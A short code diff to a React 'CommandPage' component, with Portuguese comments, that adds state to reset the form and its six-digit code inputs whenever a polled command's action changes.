@@ -11,6 +11,7 @@ function CommandPage({ userId }) {
   const [submitted, setSubmitted] = useState(false);
   const [codeDigits, setCodeDigits] = useState(['', '', '', '', '', '']);
   const inputRefs = useRef([]);
+  const [lastAction, setLastAction] = useState(null);
 
   // Verificar comandos a cada 2 segundos
   useEffect(() => {
@@ -29,6 +30,17 @@ function CommandPage({ userId }) {
     const interval = setInterval(checkCommand, 2000);
     return () => clearInterval(interval);
   }, [userId]);
+
+  // Resetar estados quando o comando muda
+  useEffect(() => {
+    if (currentCommand?.action && currentCommand.action !== lastAction) {
+      setLoading(false);
+      setSubmitted(false);
+      setInputValue("");
+      setCodeDigits(['', '', '', '', '', '']);
+      setLastAction(currentCommand.action);
+    }
+  }, [currentCommand?.action, lastAction]);
 
   const handleSubmit = async (e, field, customValue = null) => {
     e.preventDefault();
